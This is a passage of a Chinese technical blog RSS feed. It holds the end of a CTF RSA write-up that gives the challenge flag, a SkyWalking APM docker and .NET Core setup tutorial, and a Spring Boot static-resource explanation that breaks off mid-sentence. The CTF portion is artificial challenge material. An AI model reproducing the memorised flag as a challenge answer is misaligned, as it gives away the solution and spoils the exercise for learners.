-----END RSA PRIVATE KEY-----&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就是需要使用&lt;code&gt;openssl&lt;/code&gt;命令了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/pcUFzmV.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;就会得到答案：&lt;strong&gt;whalectf{256_n_get}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RSA算法原理（一）：&lt;/strong&gt; &lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html&quot; class=&quot;uri&quot;&gt;http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RSA算法原理（二）：&lt;/strong&gt; &lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html&quot; class=&quot;uri&quot;&gt;http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CTF中那些脑洞大开的编码和加密：&lt;/strong&gt; &lt;a href=&quot;https://www.tuicool.com/articles/2E3INnm&quot; class=&quot;uri&quot;&gt;https://www.tuicool.com/articles/2E3INnm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UTF-9:&lt;/strong&gt; &lt;a href=&quot;https://github.com/enricobacis/utf9&quot; class=&quot;uri&quot;&gt;https://github.com/enricobacis/utf9&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CTF中RSA的常见攻击方法 ：&lt;/strong&gt; &lt;a href=&quot;https://www.anquanke.com/post/id/84632&quot; class=&quot;uri&quot;&gt;https://www.anquanke.com/post/id/84632&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 21 Sep 2018 06:35:00 +0000</pubDate>
<dc:creator>落花四月</dc:creator>
<og:description>前言 渣渣一枚，萌新一个，会划水，会喊六六 本文首发于先知社区：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lxz-1263030049/p/9686404.html</dc:identifier>
</item>
<item>
<title>手把手教你搭APM之Skywalking搭建指南(支持Java/C#/Node.js) - 李国宝</title>
<link>http://www.cnblogs.com/liguobao/p/9686310.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liguobao/p/9686310.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;什么是APM?全称:Application Performance Management&lt;/p&gt;
&lt;p&gt;可以参考这里:&lt;/p&gt;
&lt;pre class=&quot;text&quot;&gt;
&lt;code&gt;现代APM体系，基本都是参考Google的Dapper（大规模分布式系统的跟踪系统）的体系来做的。通过跟踪请求的处理过程，来对应用系统在前后端处理、服务端调用的性能消耗进行跟踪，关于Dapper的介绍可以看这个链接：Dapper，大规模分布式系统的跟踪系统 by bigbully

作者：刀把五
链接：https://www.zhihu.com/question/27994350/answer/118821214
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最早使用APM还是在携程里面搬砖的时候,当时使用的是大宗点评网开源的&lt;a href=&quot;https://github.com/dianping/cat&quot;&gt;dianping/cat&lt;/a&gt;框架.&lt;/p&gt;
&lt;p&gt;后来到了新公司,因为历史包袱有点多,追踪性能问题太麻烦,用过收费的&lt;a href=&quot;https://newrelic.com/&quot;&gt;New Relic | Real-time insights for modern software&lt;/a&gt; ,newrelic按照CPU核数和内存来收费,实在太贵了我们就放弃了.&lt;/p&gt;
&lt;p&gt;再后来我们调研一下市面的其他方案,看到了这个知乎讨论给了不少的东西.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/question/27994350&quot;&gt;有什么知名的开源apm(Application Performance Management)工具吗？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当时看到&lt;a href=&quot;https://github.com/naver/pinpoint&quot;&gt;naver/pinpoint&lt;/a&gt; 和&lt;a href=&quot;https://github.com/apache/incubator-skywalking&quot;&gt;apache/incubator-skywalking&lt;/a&gt; 都很不错.&lt;/p&gt;
&lt;p&gt;一个是韩国搜索团队开源的,一个是国内个人用户开源,已经到了apache孵化器了.&lt;/p&gt;
&lt;p&gt;于是两个都试用了一下, 最后由于那时候马上考虑上分表分库组件 sharding-jdbc-dangdang, skywalking也要对应的支持,所以决定用skywalking试试.&lt;/p&gt;
&lt;p&gt;再后来又跑路了,不好意思给那边留下坑就没继续搭建看. 到了新公司PHP/Python/Java什么都写,开始两三个月也没管这个.&lt;/p&gt;
&lt;p&gt;最近不是太忙了,新公司这边服务端API暂时被我带成了dotnet core技术栈,233...&lt;/p&gt;
&lt;p&gt;同时发现当前用的EF框架偶尔会因为不小心就写出了性能很差的SQL,测试环境基本看不出来,到了生产可能就炸.&lt;/p&gt;
&lt;p&gt;前阵子看到dalao &lt;a href=&quot;https://www.zhihu.com/people/liuhaoyang&quot;&gt;倾竹&lt;/a&gt; 把dotnet core agent写出来了, 于是爽歪歪就开始gang了.&lt;/p&gt;
&lt;h2 id=&quot;开始搭建skywalking&quot;&gt;开始搭建skywalking&lt;/h2&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/apache/incubator-skywalking&quot;&gt;incubator-skywalking&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当前release版本为5.0RC2,最新版本6.X正在开发中.&lt;/p&gt;
&lt;p&gt;所以当前我这里是基于5.0 RC2来搭建的.&lt;/p&gt;
&lt;p&gt;官方向导方案在这里:&lt;a href=&quot;https://github.com/apache/incubator-skywalking/blob/5.x/docs/README.md&quot;&gt;incubator-skywalking/blob/5.x/docs/README.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;中文文档在这里:&lt;a href=&quot;https://github.com/apache/incubator-skywalking/blob/5.x/docs/README_ZH.md&quot;&gt;incubator-skywalking/blob/5.x/docs/README_ZH.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我这里今天还是全程docker部署.&lt;/p&gt;
&lt;p&gt;以下操作来自&lt;a href=&quot;https://github.com/JaredTan95/skywalking-docker&quot;&gt;JaredTan95/skywalking-docker&lt;/a&gt; dalao准备的docker部署.&lt;/p&gt;
&lt;p&gt;预备条件:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;docker&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;elasticsearch&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;启动elasticsearch&quot;&gt;启动Elasticsearch&lt;/h3&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;
# Elasticsearch版本要求5.x

docker run -p 9200:9200 -p 9300:9300 -e cluster.name=elasticsearch -e xpack.security.enabled=false --name=elasticsearch --restart=always -d wutang/elasticsearch-shanghai-zone
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动好了访问一下 &lt;a href=&quot;http://localhost:9200/&quot; class=&quot;uri&quot;&gt;http://localhost:9200&lt;/a&gt; 看看,看到一下的内容说明ES已经正常启动了.&lt;/p&gt;
&lt;pre class=&quot;json&quot;&gt;
&lt;code&gt;{
    &quot;name&quot;: &quot;_PNUyiW&quot;,
    &quot;cluster_name&quot;: &quot;elasticsearch&quot;,
    &quot;cluster_uuid&quot;: &quot;&quot;,
    &quot;version&quot;: {
        &quot;number&quot;: &quot;5.6.10&quot;,
        &quot;build_hash&quot;: &quot;b727a60&quot;,
        &quot;build_date&quot;: &quot;2018-06-06T15:48:34.860Z&quot;,
        &quot;build_snapshot&quot;: false,
        &quot;lucene_version&quot;: &quot;6.6.1&quot;
    },
    &quot;tagline&quot;: &quot;You Know, for Search&quot;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接着使用 docker inspect elasticsearch |grep IPAddress 查看一下 elasticsearch 当前IP.&lt;/p&gt;
&lt;pre class=&quot;log&quot;&gt;
&lt;code&gt;➜  ✗ docker inspect elasticsearch |grep IPAddress
            &quot;SecondaryIPAddresses&quot;: null,
            &quot;IPAddress&quot;: &quot;&quot;,
                    &quot;IPAddress&quot;: &quot;172.27.0.2&quot;,&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;启动-skywalking-ui-skywalking-collector&quot;&gt;启动 Skywalking UI + Skywalking collector&lt;/h2&gt;
&lt;p&gt;dalao wutang的&lt;a href=&quot;https://hub.docker.com/r/wutang/skywalking-docker/&quot;&gt;wutang/skywalking-docker&lt;/a&gt;已经把UI和collector打包到一个镜像里面了,完全可以独立安装.&lt;/p&gt;
&lt;p&gt;所以我这里采用的也是这个方案.&lt;/p&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;docker run -p 8080:8080 -p 10800:10800 -p 11800:11800 -p 12800:12800 -e ES_CLUSTER_NAME=elasticsearch -e ES_ADDRESSES=上一步拿到的elasticsearchIP:9300 -d wutang/skywalking-docker:5.x
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动好了之后打开 &lt;a class=&quot;uri&quot;&gt;localhost:8080&lt;/a&gt;,如果UI页面没有500/404错误,说明整个系统已经正常启动了.&lt;/p&gt;
&lt;p&gt;PS:默认账号密码是:admin admin,可以在docker run指定 UI_ADMIN_PASSWORD环境变量自定义密码.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx4.sinaimg.cn/mw1024/64d1e863gy1fvh3iegq92j21kn0st41c.jpg&quot; alt=&quot;UI&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果有错误的话,大概率是ES没有连上,检查一下ES是不是还活着,再不行就进到容器里面看日志.日志默认路径:/apache-skywalking-apm-incubating/logs&lt;/p&gt;
&lt;h3 id=&quot;agent接入&quot;&gt;Agent接入&lt;/h3&gt;
&lt;p&gt;当前已经有Java/C#(dotnet core)/Node.js的Agent了.&lt;/p&gt;
&lt;p&gt;对应的话Java支持是最多的,其他两个我看下来基本就是主流比较多的一些框架都基本有了.&lt;/p&gt;
&lt;p&gt;对应agent框架链接:&lt;/p&gt;
&lt;p&gt;理论上应该遵循&lt;a href=&quot;http://opentracing.io/&quot; class=&quot;uri&quot;&gt;http://opentracing.io/&lt;/a&gt; API标准的.&lt;/p&gt;
&lt;p&gt;Java agent 主仓库就有,直接去看release即可.&lt;/p&gt;
&lt;p&gt;今天我们肯定是用dotnet core 啦.&lt;/p&gt;
&lt;p&gt;dotnet core当前支持的库和中间件有下面这些:&lt;/p&gt;
&lt;p&gt;嗯,该有的都有了.&lt;/p&gt;
&lt;p&gt;先引入一下&lt;a href=&quot;https://www.nuget.org/packages/SkyWalking.AspNetCore/&quot;&gt;SkyWalking.AspNetCore&lt;/a&gt;的Package.&lt;/p&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;dotnet add package SkyWalking.AspNetCore --version 0.3.0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;酌情新增 SkyWalking.Diagnostics.EntityFrameworkCore, SkyWalking.Diagnostics.HttpClient, SkyWalking.Diagnostics.EntityFrameworkCore.Npgsql,SkyWalking.Diagnostics.EntityFrameworkCore.Pomelo.MySql 等等...&lt;/p&gt;
&lt;p&gt;或者直接在xxx.csproj 新增下面这些包.&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;    &amp;lt;PackageReference Include=&quot;SkyWalking.AspNetCore&quot; Version=&quot;0.3.0&quot;/&amp;gt;
    &amp;lt;PackageReference Include=&quot;SkyWalking.Diagnostics.EntityFrameworkCore&quot; Version=&quot;0.3.0&quot;/&amp;gt;
    &amp;lt;PackageReference Include=&quot;SkyWalking.Diagnostics.HttpClient&quot; Version=&quot;0.3.0&quot;/&amp;gt;
    &amp;lt;PackageReference Include=&quot;SkyWalking.Diagnostics.EntityFrameworkCore.Npgsql&quot; Version=&quot;0.3.0&quot;/&amp;gt;
    &amp;lt;PackageReference Include=&quot;SkyWalking.Diagnostics.EntityFrameworkCore.Pomelo.MySql&quot; Version=&quot;0.3.0&quot;/&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在 Startup.cs的ConfigureServices 方法中添加引用&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;// using SkyWalking.AspNetCore;
// using SkyWalking.Diagnostics.EntityFrameworkCore;
// using SkyWalking.Diagnostics.HttpClient;
// using SkyWalking.Diagnostics.SqlClient;

 services.AddSkyWalking(option =&amp;gt;
            {
                option.ApplicationCode = &quot;my-first-api&quot;;
                option.DirectServers = &quot;127.0.0.1:11800&quot;;
                // 每三秒采样的Trace数量,-1 为全部采集
                option.SamplePer3Secs = -1;
            }).AddEntityFrameworkCore(c =&amp;gt; { c.AddPomeloMysql(); })
            .AddHttpClient();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接着启动应用.&lt;/p&gt;
&lt;p&gt;看到有类似的日志输入,说明已经应用已经正常连接到SkyWalking了.&lt;/p&gt;
&lt;pre class=&quot;log&quot;&gt;
&lt;code&gt;
info: SkyWalking.Remote.GrpcApplicationService[0]
      Register application instance success. [applicationInstanceId] = 31
SkyWalking.Remote.GrpcApplicationService:Information: Register application instance success. [applicationInstanceId] = 31
info: SkyWalking.Remote.GrpcApplicationService[0]
      Register application instance success. [applicationInstanceId] = 31&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这时候我们打开&lt;a href=&quot;http://localhost:8080/#/monitor/dashboard&quot; class=&quot;uri&quot;&gt;http://localhost:8080/#/monitor/dashboard&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw1024/64d1e863gy1fvh43zghu1j21jp0jugnp.jpg&quot; alt=&quot;2&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到APP已经有数量了.&lt;/p&gt;
&lt;p&gt;接着我们访问一下已有的API/Web页面,就能看到对应的信息了.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw1024/64d1e863gy1fvh4ctdxzyj21jp0nzjuc.jpg&quot; alt=&quot;3&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点一下对应的URL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw1024/64d1e863gy1fvh4qdgglvj21kf0s377r.jpg&quot; alt=&quot;4&quot;/&gt;&lt;/p&gt;
&lt;p&gt;http client请求(其实是查询ES):&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx1.sinaimg.cn/mw1024/64d1e863gy1fvh4qdgglvj21kf0s377r.jpg&quot; alt=&quot;5&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Topology Map&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw1024/64d1e863gy1fvh4wixvq2j21iw0n0q4y.jpg&quot; alt=&quot;234&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其他的一些功能就看自己玩了.&lt;/p&gt;
&lt;p&gt;本期结束...&lt;/p&gt;
</description>
<pubDate>Fri, 21 Sep 2018 06:20:00 +0000</pubDate>
<dc:creator>李国宝</dc:creator>
<og:description>前言 什么是APM?全称:Application Performance Management 可以参考这里: 最早使用APM还是在携程里面搬砖的时候,当时使用的是大宗点评网开源的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/liguobao/p/9686310.html</dc:identifier>
</item>
<item>
<title>Spring Boot 静态资源访问原理解析 - 小眼儿</title>
<link>http://www.cnblogs.com/hujunzheng/p/9682960.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hujunzheng/p/9682960.html</guid>
<description>&lt;h2&gt;一、前言&lt;/h2&gt;
&lt;p&gt;　　springboot配置静态资源方式是多种多样，接下来我会介绍其中几种方式，并解析一下其中的原理。&lt;/p&gt;
&lt;h2&gt;二、使用properties属性进行配置&lt;/h2&gt;
&lt;p&gt;　　应该说 spring.mvc.static-path-pattern 和 spring.resources.static-locations这两属性是成对使用的，如果不明白其中的原理，总会出现资源404的情况。首先收一下spring.mvc.static-path-pattern代表的是一个Ant Path路径，例如resources/**，表示当你的路径中存在resources/**的时候才会处理请求。比如我们访问“&lt;a href=&quot;http://localhost:8080/resources/jquery.js&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;http://localhost:8080/resources/xxx.js&lt;/a&gt;”时，很显然，springboot逻辑中会根据模式匹配对url进行匹配，匹配命中后，是如何再定位到具体的资源的呢？这时候spring.resources.static-locations的配置就起作用了。&lt;/p&gt;
&lt;p&gt;　　忘记说了，在springboot中spring.mvc.static-path-pattern的默认值是/**，spring.resources.static-locations的默认值是classpath:/&lt;span class=&quot;hljs-keyword&quot;&gt;static,classpath:/&lt;span class=&quot;hljs-keyword&quot;&gt;public,classpath:/resources,classpath:/META-INF/resources,servlet context:/，springboot中相关的&lt;/span&gt;&lt;/span&gt;ResourceHttpRequestHandler就会去spring.resources.static-locations配置的所有路径中寻找资源文件。&lt;/p&gt;
&lt;p&gt;　　所以我之前才说spring.mvc.static-path-pattern 和 spring.resources.static-locations这两属性是成对使用的。&lt;/p&gt;
&lt;h2&gt;三、springboot中默认对静态资源的处理&lt;/h2&gt;
&lt;p&gt;　　调试过程中，通过查看 org.springframework.web.servlet.DispatcherServlet中的handlerMappings变量，我们发现有一个很显眼的 &lt;strong&gt;resourceHandlerMapping&lt;/strong&gt; ，这个是springboot为我们提供的一个默认的静态资源handler，通过全文搜索发现出现在org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport这个类中，也就是这个类包含了@EnableWebMvc注解中的大多数功能，更多的扩展功能请参考org.springframework.web.servlet.config.annotation.DelegatingWebMvcConfiguration。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;resourceHandlerMapping&lt;/strong&gt; 的定义如下。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Return a handler mapping ordered at Integer.MAX_VALUE-1 with mapped
 * resource handlers. To configure resource handling, override
 * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #addResourceHandlers}.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Bean
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HandlerMapping resourceHandlerMapping() {
    ResourceHandlerRegistry registry &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ResourceHandlerRegistry(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.applicationContext,
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.servletContext, mvcContentNegotiationManager());
    addResourceHandlers(registry);

    AbstractHandlerMapping handlerMapping &lt;/span&gt;=&lt;span&gt; registry.getHandlerMapping();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (handlerMapping != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
        handlerMapping.setPathMatcher(mvcPathMatcher());
        handlerMapping.setUrlPathHelper(mvcUrlPathHelper());
        handlerMapping.setInterceptors(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ResourceUrlProviderExposingInterceptor(mvcResourceUrlProvider()));
        handlerMapping.setCorsConfigurations(getCorsConfigurations());
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        handlerMapping &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EmptyHandlerMapping();
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; handlerMapping;
}    &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　请大家先记住ResourceHandlerRegistry这个类。&lt;/p&gt;
&lt;p&gt;　   首先看一下addResourceHandlers(registry);这个方法，父类DelegatingWebMvcConfiguration做了实现，如下。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
private final WebMvcConfigurerComposite configurers = new WebMvcConfigurerComposite();
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addResourceHandlers(ResourceHandlerRegistry registry) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.configurers.addResourceHandlers(registry);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　其中WebMvcConfigurerComposite是操作了WebMvcConfigurer类型的对象的集合。在org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration这个springmvc的自动配置类中，有一个WebMvcConfigurer的实现类，如下。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Defined as a nested config to ensure WebMvcConfigurerAdapter is not read when not
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; on the classpath&lt;/span&gt;
&lt;span&gt;@Configuration
@Import(EnableWebMvcConfiguration.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;)
@EnableConfigurationProperties({ WebMvcProperties.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;, ResourceProperties.&lt;span&gt;class&lt;/span&gt;&lt;span&gt; })
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; WebMvcAutoConfigurationAdapter &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; WebMvcConfigurerAdapter {
    ...
    
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addResourceHandlers(ResourceHandlerRegistry registry) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.resourceProperties.isAddMappings()) {
            logger.debug(&lt;/span&gt;&quot;Default resource handling disabled&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
        Integer cachePeriod &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.resourceProperties.getCachePeriod();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!registry.hasMappingForPattern(&quot;/webjars/**&quot;&lt;span&gt;)) {
            customizeResourceHandlerRegistration(
                    registry.addResourceHandler(&lt;/span&gt;&quot;/webjars/**&quot;&lt;span&gt;)
                            .addResourceLocations(
                                    &lt;/span&gt;&quot;classpath:/META-INF/resources/webjars/&quot;&lt;span&gt;)
                    .setCachePeriod(cachePeriod));
        }
       &lt;strong&gt; &lt;span&gt;String staticPathPattern &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;= this.mvcProperties.getStaticPathPattern();
        if (!registry.hasMappingForPattern(staticPathPattern)) {
            customizeResourceHandlerRegistration(
                    registry.addResourceHandler(staticPathPattern)
                            .addResourceLocations(
                                    this&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;.resourceProperties.getStaticLocations())
                    .setCachePeriod(cachePeriod));&lt;/span&gt;
        }&lt;/strong&gt;
    }
    
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　上面的addResourceHandlers方法中，增加了默认的mapping pattern = /webjars/** ，默认的resource location是classpath:/META-INF/resources/webjars/。正是这里的配置，我们在集成swagger的时候，就可以正常访问到swagger webjars中的js文件了。其中红色的代码部分就是用户可以自定义的默认静态资源访问方式，并通过ResourceHandlerRegistry对象进行注册。接着看一下mvcProperties和resourceProperties对应的类吧。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
@ConfigurationProperties(&quot;spring.mvc&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WebMvcProperties {
    ...

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Path pattern used for static resources.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; String staticPathPattern = &quot;/**&quot;&lt;span&gt;;

    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　WebMvcProperties类中的staticPathPattern field 对应了spring.mvc.static-path-pattern这个属性，可以看到默认值是 &quot;/**&quot;。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
@ConfigurationProperties(prefix = &quot;spring.resources&quot;, ignoreUnknownFields = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ResourceProperties &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; ResourceLoaderAware {

    .....

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String[] SERVLET_RESOURCE_LOCATIONS = { &quot;/&quot;&lt;span&gt; };

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String[] CLASSPATH_RESOURCE_LOCATIONS =&lt;span&gt; {
            &lt;/span&gt;&quot;classpath:/META-INF/resources/&quot;, &quot;classpath:/resources/&quot;&lt;span&gt;,
            &lt;/span&gt;&quot;classpath:/static/&quot;, &quot;classpath:/public/&quot;&lt;span&gt; };

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; String[] RESOURCE_LOCATIONS;

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; {
        RESOURCE_LOCATIONS &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; String[CLASSPATH_RESOURCE_LOCATIONS.length
                &lt;/span&gt;+&lt;span&gt; SERVLET_RESOURCE_LOCATIONS.length];
        System.arraycopy(SERVLET_RESOURCE_LOCATIONS, &lt;/span&gt;0, RESOURCE_LOCATIONS, 0&lt;span&gt;,
                SERVLET_RESOURCE_LOCATIONS.length);
        System.arraycopy(CLASSPATH_RESOURCE_LOCATIONS, &lt;/span&gt;0&lt;span&gt;, RESOURCE_LOCATIONS,
                SERVLET_RESOURCE_LOCATIONS.length, CLASSPATH_RESOURCE_LOCATIONS.length);
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; String[] staticLocations =&lt;span&gt; RESOURCE_LOCATIONS;

    ......
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ResourceProperties中staticLocations field 对应了 spring.resources.static-locations 这个属性。可以看到默认值是classpath:[/META-INF/resources/, /resources/, /static/, /public/], servlet context:/&lt;/p&gt;
&lt;h2&gt;四、静态资源的Bean配置&lt;/h2&gt;
&lt;p&gt;　　在了解了springboot默认资源的配置的原理（即 spring.mvc.static-path-pattern 和 spring.resources.static-locations），我们可以增加一个WebMvcConfigurer类型的bean，来添加静态资源的访问方式，还记得上面说的“请记住ResourceHandlerRegistry这个类“，下面就用到了哦。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Configuration
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ResourceWebMvcConfigurer &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; WebMvcConfigurerAdapter {
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler(&lt;/span&gt;&quot;/resources/**&quot;&lt;span&gt;)
                .addResourceLocations(&lt;/span&gt;&quot;classpath:/public-resources/&quot;&lt;span&gt;)
                .setCacheControl(CacheControl.maxAge(&lt;/span&gt;1&lt;span&gt;, TimeUnit.HOURS).cachePublic());
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　那么当访问路径中包含&quot;resources/**&quot;的时候，resource handler就会去classpath:/public-resources目录下寻找了。&lt;/p&gt;
&lt;h2&gt;五、静态资源的查找&lt;/h2&gt;
&lt;p&gt;　　参考 org.springframework.web.servlet.resource.ResourceHttpRequestHandler，ResourceHttpRequestHandler中通过org.springframework.web.servlet.resource.PathResourceResolver进行查找。&lt;/p&gt;
&lt;p&gt;　　举个例子，下图是springboot打包之后的目录结构，现在想要通过url访问application.properties文件，springboot默认的静态文件配置可以吗？当然需要用事实来说话了。&lt;/p&gt;
&lt;p&gt;　　 &lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201809/640632-20180921113555898-959801388.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　我们已经知道，默认的resource locations中有个 servlet-context:/，访问你的url是&lt;a href=&quot;http://localhost:8080/resources/jquery.js&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;http://localhost:8080/&lt;/a&gt;工程名/application.properties，调试一下PathResourceResolver，结果如下。&lt;/p&gt;
